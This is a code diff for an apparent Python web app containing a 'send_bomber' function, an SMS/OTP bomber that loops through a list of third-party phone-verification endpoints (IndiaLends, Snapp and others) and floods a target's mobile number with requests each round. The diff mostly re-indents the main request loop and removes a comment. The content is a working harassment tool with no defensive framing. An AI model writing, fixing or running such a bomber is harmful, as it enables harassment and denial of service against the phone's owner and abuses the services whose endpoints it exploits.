@@ -77,8 +77,7 @@ def send_bomber(mobile):
         # 15. IndiaLends (POST)
         try: session.post("https://indialends.com/internal/a/mobile-verification_v2.ashx", data={"jfsdfu14hkgertd": mobile}, headers=headers, timeout=5)
         except: pass
-          # Yahan se aapka main loop shuru hoga (while active_tasks.get(mobile, False): ke andar)
-            
+          
          apis = [
         {
             "name": "Snapp V1",
@@ -330,19 +329,19 @@ def send_bomber(mobile):
         #     "data": {"cellNumber": mobile},
         # }, # This one will send your IP to your target.
     ]
-             
-        for api in apis:
-            try:
-                if api["method"] == "POST":
-                    session.post(api["url"], json=api["data"])
-                elif api["method"] == "GET":
-                    session.get(api["url"])
-            except:
-                pass
+    for api in apis:
+        try:
+            if api["method"] == "POST":
+                session.post(api["url"], json=api["data"])
+            elif api["method"] == "GET":
+                session.get(api["url"])
+        except:
+            pass
+            
+    print(f"Round {count} Finished.")
+    count += 1
+    time.sleep(1)
 
-            print(f"Round {count} Finished.")
-            count += 1
-            time.sleep(1)
 
 
 @app.route('/')
